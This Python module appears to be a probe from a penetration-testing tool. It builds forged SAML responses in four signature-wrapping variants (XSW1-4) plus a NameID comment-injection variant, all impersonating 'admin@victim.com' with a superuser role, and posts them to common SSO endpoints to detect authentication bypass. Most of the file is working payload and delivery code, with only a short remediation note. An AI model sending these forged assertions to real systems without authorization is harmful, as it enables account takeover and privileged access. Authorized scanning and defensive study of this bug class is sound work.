"""SAML signature wrapping (XSW) + parser-differential probe.

Targets the 2025 enterprise auth-bypass class:
  - CVE-2025-47949 (samlify): signature wrapping accepted as authentic
  - CVE-2025-25291 / CVE-2025-25292 (ruby-saml): comment-truncation and
    XSW variants that let attackers forge identity assertions

The probe POSTs four XSW variants plus a comment-injection NameID variant
to common SAML ACS / login endpoints. Each forged assertion mutates the
NameID to `admin@victim.com` or sets a role AttributeValue. Detection
fires when the response looks like a successful login (302 to an app
URL, Set-Cookie session, or JSON with `authenticated:true`) when a
benign baseline got a 400 / error redirect.

XSW variants implemented:
  1. XSW1: forged unsigned assertion injected BEFORE the signed assertion
  2. XSW2: forged unsigned assertion injected AFTER the signed assertion
  3. XSW3: forged assertion as PARENT of the signed assertion
  4. XSW4: forged assertion inside <Extensions> before the real assertion

Plus a fifth probe: NameID with embedded XML comment that some parsers
strip and others don't, leading to identifier confusion.

Severity: CRITICAL on apparent auth bypass via XSW or comment injection.
"""
from __future__ import annotations

import base64
import logging
from typing import Any

from engine.probes import ProbeContext, registry

logger = logging.getLogger("pentest-ai.probes.web.saml_xsw")

# Endpoints commonly used as SAML ACS / SSO entry points.
SAML_ENDPOINTS: tuple[str, ...] = (
    "/saml/acs",
    "/saml/login",
    "/saml/consume",
    "/sso/saml",
    "/api/saml",
    "/api/saml/acs",
    "/auth/saml/callback",
    "/auth/saml",
    "/sp/ACS",
    "/Shibboleth.sso/SAML2/POST",
)

VICTIM_NAMEID = "admin@victim.com"
VICTIM_ROLE = "superuser"

# Login-success markers in body / headers.
SUCCESS_BODY_MARKERS: tuple[str, ...] = (
    '"authenticated":true',
    '"authenticated": true',
    '"loggedIn":true',
    '"logged_in":true',
    '"success":true',
    "Welcome admin",
    "dashboard",
)
LOGGED_IN_REDIRECT_HINTS: tuple[str, ...] = (
    "/dashboard",
    "/home",
    "/account",
    "/profile",
    "/admin",
)
ERROR_REDIRECT_HINTS: tuple[str, ...] = (
    "/error",
    "/login?error",
    "/sso/error",
    "/saml/error",
    "/unauthorized",
)


def _signed_assertion_block(nameid: str = "alice@example.com") -> str:
    """Produce a placeholder 'signed' assertion. We can't actually sign;
    the probe relies on the server accepting the wrapper structure as
    authoritative. CVE-2025-47949 class bugs mis-resolve which assertion
    the signature covers, so even an obviously-broken Signature element
    is enough to trigger the bug pattern in vulnerable parsers.
    """
    return (
        '<saml:Assertion ID="signed-real" '
        'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
        "<saml:Subject>"
        f"<saml:NameID>{nameid}</saml:NameID>"
        "</saml:Subject>"
        '<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
        "<ds:SignedInfo>"
        '<ds:Reference URI="#signed-real">'
        "<ds:DigestValue>AAAA</ds:DigestValue>"
        "</ds:Reference>"
        "</ds:SignedInfo>"
        "<ds:SignatureValue>AAAA</ds:SignatureValue>"
        "</ds:Signature>"
        "</saml:Assertion>"
    )


def _forged_assertion(role: str = VICTIM_ROLE) -> str:
    return (
        '<saml:Assertion ID="forged-evil" '
        'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
        "<saml:Subject>"
        f"<saml:NameID>{VICTIM_NAMEID}</saml:NameID>"
        "</saml:Subject>"
        "<saml:AttributeStatement>"
        '<saml:Attribute Name="role">'
        f"<saml:AttributeValue>{role}</saml:AttributeValue>"
        "</saml:Attribute>"
        "</saml:AttributeStatement>"
        "</saml:Assertion>"
    )


def _wrap_response(inner: str) -> str:
    """Wrap inner XML in a SAML Response envelope."""
    return (
        '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
        'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
        'ID="response-1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">'
        "<saml:Issuer>https://idp.victim.com</saml:Issuer>"
        f"{inner}"
        "</samlp:Response>"
    )


def build_baseline_xml() -> str:
    """Minimal benign SAML response, no XSW. Used to capture baseline."""
    return _wrap_response(_signed_assertion_block())


def build_xsw1() -> str:
    """XSW1: forged assertion BEFORE signed assertion."""
    return _wrap_response(_forged_assertion() + _signed_assertion_block())


def build_xsw2() -> str:
    """XSW2: forged assertion AFTER signed assertion."""
    return _wrap_response(_signed_assertion_block() + _forged_assertion())


def build_xsw3() -> str:
    """XSW3: forged assertion as PARENT wrapping signed assertion."""
    forged_open = (
        '<saml:Assertion ID="forged-parent" '
        'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
        "<saml:Subject>"
        f"<saml:NameID>{VICTIM_NAMEID}</saml:NameID>"
        "</saml:Subject>"
    )
    forged_close = "</saml:Assertion>"
    return _wrap_response(forged_open + _signed_assertion_block() + forged_close)


def build_xsw4() -> str:
    """XSW4: forged assertion inside <Extensions> before real assertion."""
    extensions = (
        '<samlp:Extensions xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
        f"{_forged_assertion()}"
        "</samlp:Extensions>"
    )
    return _wrap_response(extensions + _signed_assertion_block())


def build_comment_injection() -> str:
    """NameID with embedded XML comment.

    CVE-2025-25291-style: parsers that concatenate text-node siblings
    after stripping comments see `admin@victim.com.attacker`; parsers
    that do see only `admin@victim.com`. The mismatch lets attacker
    log in as admin while the IdP signs `admin@victim.com.attacker`.
    """
    nameid_with_comment = (
        f"{VICTIM_NAMEID}<!--injected-->.attacker.com"
    )
    return _wrap_response(_signed_assertion_block(nameid=nameid_with_comment))


XSW_VARIANTS: tuple[tuple[str, str], ...] = (
    ("XSW1", "build_xsw1"),
    ("XSW2", "build_xsw2"),
    ("XSW3", "build_xsw3"),
    ("XSW4", "build_xsw4"),
    ("CommentInjection", "build_comment_injection"),
)

_BUILDERS = {
    "build_xsw1": build_xsw1,
    "build_xsw2": build_xsw2,
    "build_xsw3": build_xsw3,
    "build_xsw4": build_xsw4,
    "build_comment_injection": build_comment_injection,
}


async def _post_saml(
    session: Any, url: str, xml: str
) -> tuple[int, dict[str, str], str]:
    """POST a SAML response form-encoded as `SAMLResponse=base64xml`."""
    encoded = base64.b64encode(xml.encode("utf-8")).decode("ascii")
    body = f"SAMLResponse={encoded}&RelayState=/"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "pentest-ai/0.11",
    }
    try:
        async with session.post(
            url, data=body, headers=headers, allow_redirects=False, timeout=8
        ) as resp:
            text = await resp.text(errors="replace")
            return (
                resp.status,
                {k: v for k, v in resp.headers.items()},
                text[:65000],
            )
    except Exception as exc:  # noqa: BLE001
        logger.debug("saml POST failed on %s: %s", url, exc)
        return 0, {}, ""


def _looks_logged_in(
    status: int, headers: dict[str, str], body: str
) -> bool:
    """True when response shape resembles a successful login."""
    location = headers.get("Location", "") or headers.get("location", "")
    set_cookie = headers.get("Set-Cookie", "") or headers.get("set-cookie", "")

    if status in (301, 302, 303, 307) and location:
        loc_lc = location.lower()
        if any(h in loc_lc for h in ERROR_REDIRECT_HINTS):
            return False
        if any(h in loc_lc for h in LOGGED_IN_REDIRECT_HINTS):
            return True

    if set_cookie and status in (200, 302):
        sc_lc = set_cookie.lower()
        # Only a session-cookie set on a 200/302 response counts;
        # error pages can still set tracking cookies.
        if any(
            tok in sc_lc
            for tok in ("session", "sid=", "auth=", "jwt=", "token=")
        ):
            return True

    if status == 200:
        for marker in SUCCESS_BODY_MARKERS:
            if marker in body:
                return True

    return False


def _emit(target: str, variant: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"SAML auth bypass via {variant} on {target}",
        "severity": "critical",
        "category": "authentication",
        "target": target,
        "evidence": f"variant={variant} :: {evidence[:200]}",
        "bug_class": "auth_bypass",
        "remediation": (
            "Validate that the signature covers the assertion actually "
            "consumed (canonicalize before parse). Reject responses with "
            "multiple Assertion elements. Strip comments before NameID "
            "comparison or reject NameID values containing comments. "
            "Patch samlify >= post-CVE-2025-47949 and ruby-saml "
            ">= post-CVE-2025-25291/25292."
        ),
    }


@registry.probe(
    name="web.saml_xsw",
    bug_class="auth_bypass",
    severity_max="critical",
    owasp="A07:2021",
    runtime_budget_s=20.0,
    tags=("anonymous", "high-roi", "saml", "auth"),
    requires_auth=False,
)
async def probe_saml_xsw(ctx: ProbeContext) -> list[dict[str, Any]]:
    """SAML XSW + parser-differential probe."""
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()

    candidates: list[str] = list(ctx.candidate_endpoints) or list(SAML_ENDPOINTS)
    for hint in ctx.endpoint_hints:
        hint_lc = hint.lower()
        is_saml_like = (
            "saml" in hint_lc or "sso" in hint_lc or "/acs" in hint_lc
        )
        if is_saml_like and hint not in candidates:
            candidates.append(hint)

    base = ctx.base.rstrip("/")

    for path in candidates:
        url = path if path.startswith(("http://", "https://")) else base + path

        # Baseline: minimal benign response
        baseline_xml = build_baseline_xml()
        b_status, b_headers, b_body = await _post_saml(ctx.session, url, baseline_xml)

        # If the endpoint doesn't exist at all (404 / 0), skip the variants.
        if b_status in (0, 404):
            continue

        # If baseline already looks logged-in, the endpoint is misbehaving
        # (or it's a fake target). Skip to avoid false-positives.
        if _looks_logged_in(b_status, b_headers, b_body):
            continue

        for variant_name, builder_key in XSW_VARIANTS:
            xml = _BUILDERS[builder_key]()
            a_status, a_headers, a_body = await _post_saml(ctx.session, url, xml)
            if not _looks_logged_in(a_status, a_headers, a_body):
                continue
            key = (url, variant_name)
            if key in seen:
                continue
            seen.add(key)
            location = (
                a_headers.get("Location")
                or a_headers.get("location")
                or ""
            )
            evidence = (
                f"status={a_status} location={location[:120]} "
                f"body={a_body[:120]}"
            )
            findings.append(_emit(url, variant_name, evidence))
            # Don't try further variants on the same endpoint once we have a hit.
            break

    return findings
